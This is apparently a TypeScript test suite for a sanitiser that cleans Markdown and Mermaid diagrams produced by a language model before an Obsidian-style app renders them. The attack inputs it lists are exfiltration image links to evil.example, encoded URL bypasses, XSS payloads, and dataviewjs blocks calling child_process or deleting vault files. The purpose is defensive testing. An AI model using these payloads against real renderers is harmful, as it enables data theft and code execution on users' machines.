import { test } from "node:test";
import assert from "node:assert/strict";
import { safeDiagram, safeMarkdown } from "../src/safemd";
import { cleanDiagram } from "../src/llm";

const ZW = "​";
/** What Obsidian would act on if it were left in: checked on the text as it will be rendered. */
const fenceLanguages = (md: string): string[] =>
	md
		.split("\n")
		.map((l) => /^(?:[ \t]*(?:>|[-*+]|\d+[.)]))*[ \t]*(?:`{3,}|~{3,})[ \t]*([^\s`]+)/.exec(l)?.[1] ?? "")
		.filter(Boolean);
const opensTag = (md: string): boolean => /<(?!\/?(?:br|sub|sup|b|i|u|em|strong|mark|kbd|s|del|small)\s*\/?>)[A-Za-z\/!?]/i.test(md);
const hasImage = (md: string): boolean => /!\[/.test(md);

test("a picture from outside the vault is not fetched, however it is written", () => {
	for (const attack of [
		"![](https://evil.example/?q=SECRET)",
		"![alt](http://evil.example/x.png)",
		"![x](//evil.example/x.png)",
		"![x](<https://evil.example/a b.png>)",
		"![x]( https://evil.example/x.png )",
		'![x](https://evil.example/x.png "title")',
		"![x](data:image/svg+xml;base64,AAAA)",
		"![x](file:///etc/passwd)",
		"![x](app://local/secret)",
		"![x](HTTPS://EVIL.example/x)",
		"![x](ht\ntps://evil.example/x)",
		"![x][ref]\n\n[ref]: https://evil.example/x.png",
		"![x][]\n\n[x]: https://evil.example/x.png",
		"![a[b]c](https://evil.example/x.png)",
		"![[https://evil.example/x.png]]",
		"![x](\\\\evil.example\\share\\x.png)",
		// Markdown decodes entities and backslash escapes inside an address.
		"![x](https&#58;//evil.example/x.png)",
		"![x](&#104;ttps://evil.example/x.png)",
		"![x](h&#x74;tps://evil.example/x.png)",
		"![x](https&colon;//evil.example/x.png)",
		"![x](https\\://evil.example/x.png)",
		"![x](/\\/evil.example/x.png)",
		"![x](&sol;&sol;evil.example/x.png)",
		"![[https&#58;//evil.example/x.png]]",
	]) {
		const safe = safeMarkdown(attack);
		assert.ok(!hasImage(safe), `still a picture: ${JSON.stringify(attack)} -> ${JSON.stringify(safe)}`);
	}
	// Pictures and embeds from the vault are untouched.
	for (const fine of ["![[diagram.png]]", "![[Folder/Note#Heading]]", "![fig](attachments/fig-1.png)", "![](img/a%20b.png)", "![[diagram.png|300]]"]) {
		assert.equal(safeMarkdown(fine), fine);
	}
});

test("HTML is not laid out, apart from the few tags that only change how text looks", () => {
	for (const attack of [
		'<img src="https://evil.example/?q=SECRET">',
		"<IMG SRC=x onerror=alert(1)>",
		'<iframe src="https://evil.example"></iframe>',
		"<script>alert(1)</script>",
		"<style>body{background:url(https://evil.example)}</style>",
		'<a href="javascript:alert(1)">x</a>',
		'<pre><code class="language-dataviewjs">app.vault</code></pre>',
		"<svg onload=alert(1)>",
		"<!-- x --><img src=x>",
		"<?xml ?>",
		'<b onmouseover="alert(1)">x</b>',
		"<br onload=x>",
		'<sub style="background:url(https://evil.example)">2</sub>',
		"<audio src=https://evil.example/a.mp3 autoplay>",
		"</div><img src=x>",
		"<link rel=stylesheet href=https://evil.example/x.css>",
		// Split over the lines of a quote, whose ">" markers the renderer takes out.
		"> <sub\n> style=x>2</sub>",
		"> <br\n> onload=x>",
	]) {
		assert.ok(!opensTag(safeMarkdown(attack)), `still a tag: ${attack}`);
	}
	// The harmless ones stay, and so does a "<" that never was a tag.
	for (const fine of ["H<sub>2</sub>O and x<sup>2</sup>", "one<br>two<br/>three<br />four", "<b>bold</b> <mark>marked</mark>", "if a < b and b <= c", "x <- 5", "A <--> B", "3<4"]) {
		assert.equal(safeMarkdown(fine), fine);
	}
	// Code that has a "<" before a letter reads the same: the change can't be seen.
	assert.equal(safeMarkdown("`List<String>`").replaceAll(ZW, ""), "`List<String>`");
});

test("a fenced block is only ever handed to Obsidian as a plain language, or none", () => {
	for (const attack of [
		"```dataviewjs\nrequire('child_process').exec('x')\n```",
		"~~~dataviewjs\nx\n~~~",
		"```dataview\nlist\n```",
		"``` dataviewjs\nx\n```",
		"```\tdataviewjs\nx\n```",
		"``` dataviewjs\nx\n```",
		"```​dataviewjs\nx\n```",
		"````dataviewjs\nx\n````",
		"   ```dataviewjs\nx\n```",
		"> ```dataviewjs\n> x\n> ```",
		"> [!note]\n> ```dataviewjs\n> x\n> ```",
		"- item\n  ```dataviewjs\n  x\n  ```",
		"1. item\n   ```dataviewjs\n   x\n   ```",
		"- ```dataviewjs\n  x\n  ```",
		"```DataviewJS\nx\n```",
		"```python dataviewjs\nx\n```",
		"```js {dataviewjs}\nx\n```",
		"```mermaid\ngraph TD\nclick A href \"javascript:alert(1)\"\n```",
		"```query\nsecret\n```",
		"```tasks\nnot done\n```",
		"```button\nname x\n```",
		"```grill-redo\n{}\n```",
		"```templater\n<% tp.user.x() %>\n```",
	]) {
		const langs = fenceLanguages(safeMarkdown(attack));
		assert.ok(
			langs.every((l) => ["python", "js"].includes(l)),
			`${JSON.stringify(attack)} -> ${JSON.stringify(safeMarkdown(attack))}`,
		);
	}
	// Ordinary code blocks are untouched, and the code inside them is.
	for (const fine of ["```python\nprint('hi')\n```", "```r\nx <- c(1, 2)\n```", "```\nplain\n```", "```sql\nselect 1;\n```", "~~~bash\nls\n~~~", "- step\n  ```js\n  let a = 1;\n  ```"]) {
		assert.equal(safeMarkdown(fine), fine);
	}
	// What followed a plain language is dropped; the language is kept.
	assert.equal(safeMarkdown("```Python title=x\n1\n```"), "```python\n1\n```");
});

test("inline code can't begin as a Dataview inline query", () => {
	for (const attack of ["`$= app.vault.adapter.remove('x')`", "`= this.file.name`", "` $= x`", "``$= x``", "```$= x```", "`\n$= x\n`", "`\t= x`", "> `\n> $= x\n> `", "> > `\n> > = x`"]) {
		const safe = safeMarkdown(attack);
		assert.ok(!/`[\s>]*\$?=/.test(safe), `${JSON.stringify(attack)} -> ${JSON.stringify(safe)}`);
		assert.equal(safe.replaceAll(ZW, ""), attack, "and it reads the same");
	}
	assert.equal(safeMarkdown("`git status` and `a == b`"), "`git status` and `a == b`");
});

test("ordinary study text comes through exactly as written", () => {
	for (const fine of [
		"What is the **mean** of $x_1, \\dots, x_n$?",
		"$$\\bar{x} = \\frac{1}{n}\\sum_{i=1}^{n} x_i$$",
		"| a | b |\n|---|---|\n| 1 | 2 |",
		"See [[Central limit theorem]] and [the docs](https://example.com/page).",
		"> [!tip] Remember\n> Variance is the mean squared deviation.",
		"1. First\n2. Second\n   - nested",
		"Is 3 < 5? And is x > y?",
		"Use `vec.push(1)` then `len()`.",
		"The answer is 42! [Really](https://example.com).",
		"",
	]) {
		assert.equal(safeMarkdown(fine), fine);
	}
	// Rust's macro brackets look the same, though they are no longer the start of a picture.
	assert.equal(safeMarkdown("`vec![1, 2]`").replaceAll(ZW, ""), "`vec![1, 2]`");
});

test("making text safe twice is the same as once", () => {
	const mixed = "![](https://e.example/x) <img src=x> `$= y`\n```dataviewjs\nz\n```\n![[a.png]] H<sub>2</sub>O";
	assert.equal(safeMarkdown(safeMarkdown(mixed)), safeMarkdown(mixed));
});

test("a diagram can't loosen Mermaid, act on a click, carry a script or lay out HTML", () => {
	const safe = safeDiagram(
		[
			'%%{init: {"securityLevel": "loose", "themeCSS": "*{background:url(https://evil.example)}"}}%%',
			"flowchart TD",
			'  A["Start<br/>here"] --> B["<img src=https://evil.example/?q=SECRET>"]',
			'  click A href "javascript:alert(1)"',
			"  click B call doEvil()",
			'  C["x"] --> D["javascript:alert(1)"]',
			"  A <--> C",
		].join("\n"),
	);
	assert.ok(!/%%\{/.test(safe));
	assert.ok(!/^\s*click\b/im.test(safe));
	assert.ok(!/javascript\s*:/i.test(safe));
	assert.ok(!opensTag(safe));
	assert.ok(safe.includes('A["Start<br/>here"]'), "a line break in a label is kept");
	assert.ok(safe.includes("A <--> C"), "and so are arrows");
	// A directive spread over lines, and one never closed.
	assert.ok(!/securityLevel/.test(safeDiagram('%%{\n init: {"securityLevel":"loose"}\n}%%\ngraph TD\nA-->B')));
	assert.ok(!/securityLevel/.test(safeDiagram('graph TD\n%%{init: {"securityLevel":"loose"}\nA-->B')));
	// One that tries to close its own code block is dropped whole.
	assert.equal(safeDiagram("graph TD\nA-->B\n```\n```dataviewjs\nx"), "");
	assert.equal(safeDiagram("graph TD\nA-->B"), "graph TD\nA-->B");
	// The model's reply goes through the same thing when it is read.
	assert.ok(!/click/.test(cleanDiagram('```mermaid\ngraph TD\nA-->B\nclick A href "https://evil.example"\n```')));
});
